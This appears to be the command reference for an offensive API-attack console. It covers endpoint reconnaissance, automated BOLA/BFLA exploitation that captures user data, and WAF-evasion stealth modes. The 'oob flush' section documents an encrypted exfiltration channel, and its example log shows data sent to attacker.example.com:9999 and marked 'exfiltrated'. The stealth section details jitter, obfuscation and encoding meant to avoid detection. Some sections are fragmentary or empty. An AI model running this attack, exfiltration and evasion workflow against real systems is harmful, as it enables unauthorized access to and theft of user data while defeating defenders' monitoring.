## All Commands by Category

### 🎯 Strategic Planning (HITL)

#### `analyze`
Generate tactical attack plan from discovered endpoints.

```bash
Usage:
> analyze

Description:
Analyzes all discovered endpoints and generates attack scenarios with
confidence scores. Populates ActionBuffer (view with list-plan). Uses
tactical planning algorithm to combine endpoints, loot, traffic patterns
and operator context.

When to use:
- After running 'map' to discover endpoints
- Before executing attacks
- When ready to plan a coordinated attack

Output:
F5 PLAN tab populates with tactical actions

Example:
> target https://api.example.com
> map
> analyze
> list-plan (view generated actions)
```

#### `list-plan`
Display all pending tactical actions.

```bash
Usage:
> list-plan

Description:
Shows all actions generated by 'analyze' that are PENDING or COMPLETE.
Displays ID, Type (BOLA/BFLA/SSRF), Target endpoint, Payload, Confidence
score (HIGH/MEDIUM/LOW), and Status (PENDING/SUCCESS/FAILED/DROPPED).

When to use:
- After running 'analyze'
- To review actions before commit
- To check execution results after commit

Output:
List of actions in tactical feed (F1)
Also visible in F5 PLAN tab as table

Example:
> list-plan
[08:30:00] ACTION 1: BOLA /api/users [HIGH] [PENDING]
[08:30:01] ACTION 2: BFLA /api/admin [MEDIUM] [PENDING]
```

#### `edit <id> <new_payload>`
Override payload for a specific action.

```bash
Usage:
> edit <action_id> <new_payload>

Parameters:
- <action_id>: Action ID (from list-plan)
- <new_payload>: New payload to use

Description:
Allows you to manually edit a tactical action's payload before execution.
Useful for testing specific values or bypassing AI-generated suggestions.

When to use:
- When you want to test a specific endpoint
- To override AI suggestions
- When you know the target better

Example:
> analyze
> list-plan
[Shows ACTION 1: BOLA /api/users/[id] ...]
> edit 1 /api/users/999
[08:30:05] ACTION 1 payload updated to: /api/users/999
```

#### `drop <id>`
Mark an action as DROPPED (won't execute on commit).

```bash
Usage:
> drop <action_id>

Parameters:
- <action_id>: Action ID to drop (from list-plan)

Description:
Marks a tactical action as DROPPED so it won't execute during 'commit'.
Useful for excluding noisy or false-positive actions. Can be undone by
re-running 'analyze'.

When to use:
- To skip noisy attack vectors
- To avoid testing certain endpoints
- To focus on specific vulnerabilities

Example:
> list-plan
[Shows ACTION 2: BFLA /api/admin [LOW] PENDING...]
> drop 2
[08:30:10] ACTION 2 marked as DROPPED
```

#### `commit`
Execute all PENDING tactical actions.

```bash
Usage:
> commit

Description:
Executes all actions with PENDING status. Each action runs in parallel
with real-time feedback in F5 (PLAN) tab and F6 (NEURO) tab. Updates
status to SUCCESS or FAILED based on results. Captures findings and
loot automatically.

When to use:
- After 'analyze' and reviewing actions
- Ready to actually run the attacks
- Want all results in one batch

Output:
- F5: Action status updates in real-time
- F1: Execution logs for each action
- F3: Loot table populated with findings
- DB: Persistent storage of results

Timing:
Each action typically takes 5-30 seconds depending on complexity

Example:
> analyze
> list-plan
> commit
[08:30:20] EXEC: Starting tactical action execution...
[08:30:25] EXEC: ACTION_1 BOLA /api/users - SUCCESS (3 objects)
[08:30:30] EXEC: ACTION_2 BFLA /api/admin - FAILED (no priv escalation)
```

#### `remediate <type>`
Generate middleware patches for vulnerabilities.

```bash
Usage:
> remediate <vulnerability_type>

Parameters:
- <vulnerability_type>: bola, bfla, bopla, ssrf, etc

Description:
Generates middleware code patches to fix identified vulnerabilities.
Outputs code snippets for common frameworks (Express, FastAPI, Django).
Currently generates basic templates (Sprint 16 will enhance).

When to use:
- After identifying vulnerabilities
- To generate fix suggestions
- For compliance documentation

Example:
> remediate bola
[Template for BOLA prevention middleware]
```

### 🔍 Reconnaissance & Discovery

#### `target <url>`
Set global scope URL.

```bash

> target <url>

Parameters:

Description:
Sets the global target URL for all reconnaissance and exploitation
```

#### `map [url]`
Full automatic reconnaissance (spider + swagger + scraper).

```bash
Usage:
> map
> map https://custom-url.com (optional override)

Description:
Runs full attack surface mapping:
1. Spider: Crawl all accessible endpoints
2. Swagger: Check for OpenAPI/Swagger specs
3. Scrape: Extract endpoints from JavaScript

Discovers hidden endpoints, parameters, API versions. Results shown
in F2 MAP tab as table with timestamp, source, endpoint, metadata.

When to use:
- Start of any test (discover what you're attacking)
- After deploying new API versions
- To get baseline of attack surface

Duration: 30 seconds to 5 minutes depending on site size

Example:
> target https://api.example.com
> map
[08:30:05] DISCOVER: Starting mapping...
[08:30:15] SPIDER: Found 23 endpoints
[08:30:25] SWAGGER: Found spec at /api/v1/swagger.json
[08:30:35] SCRAPE: Found 5 more endpoints in JS
```

#### `swagger <url>`
Parse OpenAPI/Swagger specifications.

```bash
Usage:
> swagger <url>
> swagger https://api.example.com/swagger.json

Description:
Manually load OpenAPI 3.0 or Swagger 2.0 specifications. Extracts all
defined endpoints, parameters, and methods. Imports into database for

When to use:
- If 'map' doesn't find Swagger automatically
```

Extract API endpoints from JavaScript.

```bash

Analyzes JavaScript bundles for hidden API endpoints. Uses regex patterns

When to use:
```

### ⚔️ Exploitation

#### `bola <url>`
Test BOLA (Broken Object Level Authorization).

```bash
Usage:
> bola <url>
> bola https://api.example.com/api/users/[id]

Description:
Tests ID enumeration and object access control bypass. Tries sequential
IDs (1,2,3...) and random IDs to see if you can access objects you
shouldn't. Captures any returned data.

OWASP: Broken Object Level Authorization (API1:2019)

When to use:
- On any endpoint with ID parameter (/users/{id})
- Where authorization might be weak
- To find sensitive user data

Results in F3 LOOT if objects are captured

Example:
> bola https://api.example.com/api/users/[id]
[08:31:30] BOLA: Testing /api/users/1
[08:31:35] BOLA: Found 15 accessible users!
[08:31:40] CAPTURED: user@example.com, user2@domain.com, ...
```

```bash
Tests privilege escalation by attempting to access admin/elevated
functions without proper authorization. Tries with different tokens

OWASP: Broken Function Level Authorization (API2:2019)

When to use:
- On admin/elevated endpoints (/admin/*, /management/*)
```

#### `oob flush`
Transmit all queued messages via encrypted OOB channel.

```bash
Usage:
> oob flush
> oob flush --all              (force all retries)
> oob flush --verbose          (detailed logging)

Description:
Processes the OOB queue and transmits all queued messages to the
configured exfiltration server. Uses exponential backoff retry logic
for failed transmissions. Returns statistics on success rate.

Connection Details:
- Channel Type: From 'oob config' command
- Server Address: Configured during setup
- Encryption: All data sent encrypted with configured key
- Protocol: Custom TCP header format or DNS queries

When to use:
- After queuing sensitive data with 'oob queue'
- During exfiltration phase of attack
- Before disconnecting from target network

Transmission Process:
1. Build message with OOB header (magic, version, type, length)
2. Encrypt payload with AES-256-GCM
3. Base64 encode for safe transmission
4. Connect to OOB server via TCP
5. Send message (retry on failure with exponential backoff)
6. Update statistics and logs

Example:
> oob flush
[08:34:45] OOB FLUSH: Processing 3 queued messages
[08:34:46] OOB: Connecting to attacker.example.com:9999
[green]✓ Message 1/3: 32 bytes transmitted (ENCRYPTED) [-]
[green]✓ Message 2/3: 48 bytes transmitted (ENCRYPTED) [-]
[08:34:47] OOB: Connection timeout, retrying...
[green]✓ Message 3/3: 96 bytes transmitted (retry 1/3) [-]
[08:34:48] OOB FLUSH COMPLETE: 3/3 messages sent successfully
[08:34:48] OOB: Total exfiltrated: 176 bytes (encrypted)
```

#### `oob dns <domain>`

```bash
Usage:
```

### 🕵️ Stealth & Evasion Control

#### `stealth <mode>`
Set preset evasion configuration (Aggressive, Fast, Silent, Debug).

```bash
Usage:
> stealth aggressive
> stealth fast
> stealth silent
> stealth debug

Parameters:
- mode: aggressive | fast | silent | debug

Description:
Switches evasion profile globally. Each mode balances speed vs stealth:

**Aggressive** (Default):
  - All evasion enabled (jitter, thinking time, backoff, obfuscation, encoding)
  - Speed Multiplier: 1.0x (normal)
  - Best for: Balanced testing, moderate WAF environments

**Fast**:
  - Reduced delays (thinking time 50%, disable encoding)
  - Speed Multiplier: 0.5x (twice as fast)
  - Best for: Quick reconnaissance, permissive WAFs
  - Trade-off: Easier to detect

**Silent**:
  - Maximum evasion (all techniques active, extra delays)
  - Speed Multiplier: 2.0x (half speed)
  - Best for: Stealth-critical targets, advanced WAF
  - Trade-off: Very slow (5-10 minutes per endpoint)

**Debug**:
  - All evasion disabled
  - Speed Multiplier: 1.0x
  - Best for: Testing, troubleshooting, baseline measurements
  - Output: No delays, no obfuscation, raw traffic

When to use:
- At start of engagement (set once, applies to all modules)
- When changing targets with different WAF strength
- When response patterns suggest detection

Individual Techniques Affected by Stealth Mode:
- Stochastic Jitter (10-150ms Gaussian distribution)
- Contextual Thinking Time (10-3000ms by request type)
- Rate-Limit Backoff (exponential 429 handling)
- Path Obfuscation (cache-busters, path parameters)
- Payload Encoding (gzip, deflate, whitespace randomization)

Example:
> stealth silent
[green::b]STEALTH:[-] Mode set to [green]SILENT[-] (maximum evasion, 2x speed)[-:-:-]

> analyze
[yellow]STEALTH:[-] Sleep skipped (toggle disabled)
[cyan]EVASION:[-] Applied stochastic jitter (100ms)
[blue]THINKING:[-] Exploitation request: Heavy jitter (800-3000ms)
```

#### `stealth toggle <feature> <on|off>`
Enable/disable individual evasion features.

```bash
Usage:
> stealth toggle jitter on
> stealth toggle thinking off
> stealth toggle backoff on
> stealth toggle obfuscation on
> stealth toggle encoding off

Parameters:
- feature: jitter | thinking | backoff | obfuscation | encoding
- state: on | off

Description:
Fine-tune evasion by toggling individual techniques. Allows selective
disabling when specific techniques cause problems or are unnecessary.

Features:
- **jitter**: Stochastic Gaussian delays (10-150ms) between requests
- **thinking**: Contextual delays by request type (GET: 10-50ms, POST: 800-3000ms)
- **backoff**: Automatic 429 rate-limit handling with exponential backoff
```
